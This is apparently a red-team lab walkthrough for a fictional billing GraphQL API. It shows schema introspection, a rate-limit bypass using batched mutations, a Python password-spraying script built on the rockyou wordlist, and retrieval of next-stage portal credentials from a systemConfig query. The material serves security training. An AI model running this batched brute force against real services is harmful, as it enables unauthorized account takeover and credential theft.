# Red Team Solve Guide — M2
## RNG-EXT-01 | M2-ext-billing-api | GraphQL Batching → Credential Brute Force
**Technique:** T1110.003 — Brute Force: Password Spraying  
**Pivot In:** Billing API key `gql-key-b2f4a8c3e9d1f7b5` (from M1 admin panel)  
**Pivot Out:** Staff Portal credentials `svcananya:BunlStaff@2025!` → M3 (Staff Auth Portal, port 5000)

---

## Objective
The GraphQL API enforces a rate limit of 5 `staffLogin` mutations per HTTP request. GraphQL batch requests (JSON arrays) count as ONE request but execute multiple operations. Use batched mutations to brute-force staff account passwords, obtain a session token, then call `systemConfig` to retrieve M3 credentials.

---

## Step 1 — Discover & Enumerate the API

```bash
# Health check
curl -s http://203.x.x.x:4000/api/v1/health
# Response: {"service": "BUNL Billing GraphQL API", "version": "2.1.4"}

# Introspection — discover schema
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind } } }"}' | python3 -m json.tool
```

Introspection reveals: queries `listConsumers`, `listStaffUsers`, `systemConfig` and mutation `staffLogin`.

```bash
# List staff users (requires the M1 API key)
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ listStaffUsers(apiKey: \"gql-key-b2f4a8c3e9d1f7b5\") { username department role } }"}' \
  | python3 -m json.tool
# Returns: svcananya (ops_manager), rktiwari (billing_admin), padmin (admin)
```

---

## Step 2 — Identify the Rate Limit Bypass

Test the rate limit:
```bash
# Five individual mutations — the 6th is blocked
for i in $(seq 1 6); do
  curl -s -X POST http://203.x.x.x:4000/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { staffLogin(username: \"padmin\", password: \"test'$i'\") { token } }"}' \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data') or d.get('errors'))"
done
# 6th response: "Rate limit exceeded."
```

Now test batch — array of 10 mutations in ONE HTTP request:
```bash
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test1\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test2\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test3\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test4\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test5\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test6\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test7\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test8\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test9\"){token}}"},
    {"query":"mutation{staffLogin(username:\"padmin\",password:\"test10\"){token}}"}
  ]'
# All 10 succeed without rate limit — bypass confirmed
```

---

## Step 3 — Brute Force with Batch Requests

Write a batch brute-force script:
```python
#!/usr/bin/env python3
import requests, json

URL = "http://203.x.x.x:4000/graphql"
USERNAMES = ["padmin", "svcananya", "rktiwari"]
PASSWORDS = open("/usr/share/wordlists/rockyou.txt", errors="ignore").read().splitlines()[:5000]
BATCH_SIZE = 20

def try_batch(user, batch_passwords):
    ops = [{"query": f'mutation{{staffLogin(username:"{user}",password:"{p}"){{token username role}}}}'} for p in batch_passwords]
    r = requests.post(URL, json=ops, headers={"Content-Type": "application/json"}, timeout=15)
    results = r.json()
    for i, res in enumerate(results):
        if res.get("data", {}).get("staffLogin"):
            return batch_passwords[i], res["data"]["staffLogin"]
    return None, None

for user in USERNAMES:
    print(f"[*] Brute-forcing {user}...")
    for i in range(0, len(PASSWORDS), BATCH_SIZE):
        batch = PASSWORDS[i:i+BATCH_SIZE]
        pw, result = try_batch(user, batch)
        if pw:
            print(f"[FOUND] {user}:{pw} | token={result['token'][:20]}... role={result['role']}")
            break
```

**Result:** `padmin:password` → token returned with role `admin`.

---

## Step 4 — Query systemConfig to Get M3 Credentials

```bash
TOKEN="<token from padmin login>"
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{ systemConfig(token: \\\"${TOKEN}\\\") { staffPortalUrl staffPortalUser staffPortalPass environment } }\"}" \
  | python3 -m json.tool
```

Response:
```json
{
  "staff_portal_url": "http://auth-portal.bunl-internal.net:5000",
  "staff_portal_user": "svcananya",
  "staff_portal_pass": "BunlStaff@2025!"
}
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | GraphQL batch request bypasses per-request rate limiting |
| Technique | Batch brute force → credential discovery |
| Credential Obtained | `svcananya:BunlStaff@2025!` (and `padmin:password`) |
| Next Machine | M3 — Staff Authentication Portal (port 5000) |
| MITRE | T1110.003 |
